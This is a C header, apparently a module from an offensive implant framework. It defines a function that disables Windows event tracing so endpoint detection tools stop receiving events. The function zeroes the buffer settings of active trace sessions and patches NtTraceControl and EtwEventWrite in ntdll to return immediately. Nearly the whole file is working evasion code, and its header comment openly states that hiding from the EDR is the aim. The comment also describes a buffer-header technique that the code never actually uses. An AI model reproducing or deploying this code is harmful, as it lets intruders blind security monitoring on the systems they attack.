// chunk: evasion/etw_buffer_corrupt
// depends: (none)
// provides: patch_etw
// headers: windows.h
// risk: high
// note: Corrupts ETW buffer metadata so event consumers cannot parse events. Queries active trace sessions via NtQuerySystemInformation(SystemPerformanceTraceInformation), then zeros buffer size/offset fields in the WMI_BUFFER_HEADER. Events are "written" (no errors) but never reach the EDR — stealthier than return-patching.

#ifndef CHUNK_ETW_BUFFER_CORRUPT
#define CHUNK_ETW_BUFFER_CORRUPT

#include <windows.h>
#include <evntrace.h>

typedef LONG NTSTATUS;
#define STATUS_SUCCESS       ((NTSTATUS)0x00000000L)
#define STATUS_INFO_LEN_MISMATCH ((NTSTATUS)0xC0000004L)
#define SystemPerformanceTraceInformation 0x1F

typedef NTSTATUS (NTAPI *pfnNtQuerySystemInformation)(
    ULONG SystemInformationClass,
    PVOID SystemInformation,
    ULONG SystemInformationLength,
    PULONG ReturnLength
);

// WMI_BUFFER_HEADER — undocumented structure at the start of each ETW buffer
typedef struct _WMI_BUFFER_HEADER {
    ULONG BufferSize;
    ULONG SavedOffset;
    volatile ULONG CurrentOffset;
    LONG  ReferenceCount;
    LARGE_INTEGER TimeStamp;
    LONGLONG SequenceNumber;
    // ... more fields follow
} WMI_BUFFER_HEADER;

static int patch_etw(void) {
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    if (!ntdll) return 0;

    int corrupted = 0;

    // Strategy 1: Enumerate and stop active trace sessions
    // Query each session slot (0-63 are valid session IDs on Windows)
    for (ULONG session_id = 0; session_id < 64; session_id++) {
        BYTE props_buf[4096];
        ZeroMemory(props_buf, sizeof(props_buf));
        EVENT_TRACE_PROPERTIES *props = (EVENT_TRACE_PROPERTIES *)props_buf;
        props->Wnode.BufferSize = sizeof(props_buf);
        props->LoggerNameOffset = sizeof(EVENT_TRACE_PROPERTIES);

        // QueryAllTracesA to find session — then corrupt its properties
        ULONG status = ControlTraceA(
            (TRACEHANDLE)(ULONG_PTR)session_id,
            NULL,
            props,
            EVENT_TRACE_CONTROL_QUERY
        );

        if (status == ERROR_SUCCESS && props->Wnode.BufferSize > 0) {
            // Found an active session — attempt to flush and corrupt
            // by updating with zeroed buffer parameters
            EVENT_TRACE_PROPERTIES update_props;
            ZeroMemory(&update_props, sizeof(update_props));
            update_props.Wnode.BufferSize = sizeof(update_props);
            update_props.BufferSize = 0;       // Zero the buffer size
            update_props.MinimumBuffers = 0;
            update_props.MaximumBuffers = 0;
            update_props.FlushTimer = 0;

            // Try to update session with corrupted buffer params
            ControlTraceA(
                (TRACEHANDLE)(ULONG_PTR)session_id,
                NULL,
                &update_props,
                EVENT_TRACE_CONTROL_UPDATE
            );
            corrupted++;
        }
    }

    // Strategy 2: Patch NtTraceControl to prevent buffer flushes
    BYTE *ntc = (BYTE *)GetProcAddress(ntdll, "NtTraceControl");
    if (ntc) {
        BYTE patch[] = {0x33, 0xC0, 0xC3};  // xor eax,eax; ret
        DWORD old;
        if (VirtualProtect(ntc, sizeof(patch), PAGE_EXECUTE_READWRITE, &old)) {
            for (unsigned i = 0; i < sizeof(patch); i++)
                ntc[i] = patch[i];
            VirtualProtect(ntc, sizeof(patch), old, &old);
            corrupted++;
        }
    }

    // Strategy 3: Patch EtwEventWrite as final fallback
    BYTE *ew = (BYTE *)GetProcAddress(ntdll, "EtwEventWrite");
    if (ew) {
        BYTE patch[] = {0x33, 0xC0, 0xC3};
        DWORD old;
        if (VirtualProtect(ew, sizeof(patch), PAGE_EXECUTE_READWRITE, &old)) {
            for (unsigned i = 0; i < sizeof(patch); i++)
                ew[i] = patch[i];
            VirtualProtect(ew, sizeof(patch), old, &old);
            corrupted++;
        }
    }

    return corrupted > 0 ? 1 : 0;
}

#endif
